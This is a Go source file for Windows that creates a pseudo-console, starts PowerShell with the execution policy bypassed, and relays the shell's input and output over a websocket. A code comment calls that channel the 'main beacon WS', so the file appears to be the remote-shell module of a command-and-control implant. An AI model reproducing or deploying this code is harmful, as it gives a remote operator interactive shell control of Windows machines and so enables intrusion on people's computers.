//go:build windows

package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	procCreatePseudoConsole = kernel32.NewProc("CreatePseudoConsole")
	procClosePseudoConsole  = kernel32.NewProc("ClosePseudoConsole")
	procResizePseudoConsole = kernel32.NewProc("ResizePseudoConsole")
	procInitAttrList        = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateAttr          = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteAttrList      = kernel32.NewProc("DeleteProcThreadAttributeList")
)

const procThreadAttributePseudoconsole = 0x00020016

type coord struct {
	X int16
	Y int16
}

type PTYSession struct {
	ID        string
	hPC       uintptr
	cmd       *exec.Cmd
	cancel    context.CancelFunc
	wg        sync.WaitGroup
	closeOnce sync.Once
	inputW    *os.File
	outputR   *os.File
}

func createPipe(read, write *syscall.Handle, inheritRead bool) error {
	var sa syscall.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1
	return syscall.CreatePipe(read, write, &sa, 0)
}

func createConPTY(cols, rows int) (hPC uintptr, inputWrite, outputRead syscall.Handle, err error) {
	size := coord{X: int16(cols), Y: int16(rows)}

	var hInputRead, hInputWrite syscall.Handle
	var hOutputRead, hOutputWrite syscall.Handle

	if err := createPipe(&hInputRead, &hInputWrite, true); err != nil {
		return 0, 0, 0, fmt.Errorf("create input pipe: %w", err)
	}
	if err := createPipe(&hOutputRead, &hOutputWrite, false); err != nil {
		syscall.CloseHandle(hInputRead)
		syscall.CloseHandle(hInputWrite)
		return 0, 0, 0, fmt.Errorf("create output pipe: %w", err)
	}

	ret, _, e := procCreatePseudoConsole.Call(
		uintptr(*(*int32)(unsafe.Pointer(&size))),
		uintptr(hInputRead),
		uintptr(hOutputWrite),
		0,
		uintptr(unsafe.Pointer(&hPC)),
	)
	if ret != 0 {
		syscall.CloseHandle(hInputRead)
		syscall.CloseHandle(hInputWrite)
		syscall.CloseHandle(hOutputRead)
		syscall.CloseHandle(hOutputWrite)
		return 0, 0, 0, fmt.Errorf("CreatePseudoConsole failed: %v", e)
	}

	syscall.CloseHandle(hInputRead)
	syscall.CloseHandle(hOutputWrite)

	return hPC, hInputWrite, hOutputRead, nil
}

func startProcessWithConPTY(cmd *exec.Cmd, hPC uintptr) error {
	var size uintptr
	procInitAttrList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))

	attrList := make([]byte, size)
	ret, _, err := procInitAttrList.Call(
		uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return fmt.Errorf("InitializeProcThreadAttributeList: %v", err)
	}
	defer procDeleteAttrList.Call(uintptr(unsafe.Pointer(&attrList[0])))

	ret, _, err = procUpdateAttr.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		uintptr(procThreadAttributePseudoconsole),
		hPC,
		unsafe.Sizeof(hPC),
		0, 0,
	)
	if ret == 0 {
		return fmt.Errorf("UpdateProcThreadAttribute: %v", err)
	}

	return startProcessRaw(cmd, &attrList[0])
}

func startProcessRaw(cmd *exec.Cmd, attrListPtr *byte) error {
	cmdLine, _ := syscall.UTF16PtrFromString(cmd.Path + " " + strings.Join(cmd.Args[1:], " "))

	type startupInfoEx struct {
		cb                  uint32
		lpReserved          *uint16
		lpDesktop           *uint16
		lpTitle             *uint16
		dwX, dwY            uint32
		dwXSize, dwYSize    uint32
		dwXCountChars       uint32
		dwYCountChars       uint32
		dwFillAttribute     uint32
		dwFlags             uint32
		wShowWindow         uint16
		cbReserved2         uint16
		lpReserved2         *byte
		hStdInput           syscall.Handle
		hStdOutput          syscall.Handle
		hStdError           syscall.Handle
		lpAttributeList     *byte
	}

	si := startupInfoEx{
		cb:              uint32(unsafe.Sizeof(startupInfoEx{})),
		lpAttributeList: attrListPtr,
	}

	var pi syscall.ProcessInformation

	var envBlock *uint16
	if cmd.Env != nil {
		envStr := strings.Join(cmd.Env, "\x00") + "\x00\x00"
		envBlock, _ = syscall.UTF16PtrFromString(envStr)
	}

	dir, _ := syscall.UTF16PtrFromString(cmd.Dir)

	err := syscall.CreateProcess(
		nil, cmdLine, nil, nil, false,
		0x00080000|0x00000010,
		envBlock, dir,
		(*syscall.StartupInfo)(unsafe.Pointer(&si)),
		&pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess: %w", err)
	}

	syscall.CloseHandle(pi.Thread)
	cmd.Process, _ = os.FindProcess(int(pi.ProcessId))
	if cmd.Process == nil {
		cmd.Process = &os.Process{Pid: int(pi.ProcessId)}
	}

	return nil
}

// StartPTYLocal starts a ConPTY that streams through the main beacon WS
func StartPTYLocal(sessionID string, cols, rows int) (*PTYSession, error) {
	hPC, inputWrite, outputRead, err := createConPTY(cols, rows)
	if err != nil {
		return nil, fmt.Errorf("conpty: %w", err)
	}

	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass")

	if err := startProcessWithConPTY(cmd, hPC); err != nil {
		procClosePseudoConsole.Call(hPC)
		return nil, fmt.Errorf("start process: %w", err)
	}

	inputW := os.NewFile(uintptr(inputWrite), "conpty-input")
	outputR := os.NewFile(uintptr(outputRead), "conpty-output")

	ctx, cancel := context.WithCancel(context.Background())
	sess := &PTYSession{
		ID:      sessionID,
		hPC:     hPC,
		cmd:     cmd,
		cancel:  cancel,
		inputW:  inputW,
		outputR: outputR,
	}

	// Output → Main WS
	sess.wg.Add(1)
	go func() {
		defer sess.wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := outputR.Read(buf)
			if err != nil {
				return
			}
			if n > 0 {
				wsSend("pty_data", map[string]any{
					"session_id": sessionID,
					"output":     string(buf[:n]),
				})
			}
		}
	}()

	// Process exit
	sess.wg.Add(1)
	go func() {
		defer sess.wg.Done()
		cmd.Wait()
		log.Printf("[pty] process exited session=%s", sessionID)
		sess.Close()
	}()

	go func() {
		<-ctx.Done()
		sess.Close()
	}()

	return sess, nil
}

func (s *PTYSession) Write(data []byte) {
	if s.inputW != nil {
		s.inputW.Write(data)
	}
}

func (s *PTYSession) Resize(cols, rows int) {
	if s.hPC != 0 {
		size := coord{X: int16(cols), Y: int16(rows)}
		procResizePseudoConsole.Call(s.hPC, uintptr(*(*int32)(unsafe.Pointer(&size))))
	}
}

func (s *PTYSession) Close() {
	s.closeOnce.Do(func() {
		s.cancel()
		if s.inputW != nil {
			s.inputW.Close()
		}
		if s.outputR != nil {
			s.outputR.Close()
		}
		if s.hPC != 0 {
			procClosePseudoConsole.Call(s.hPC)
			s.hPC = 0
		}
		if s.cmd != nil && s.cmd.Process != nil {
			s.cmd.Process.Kill()
		}
		s.wg.Wait()
	})
}
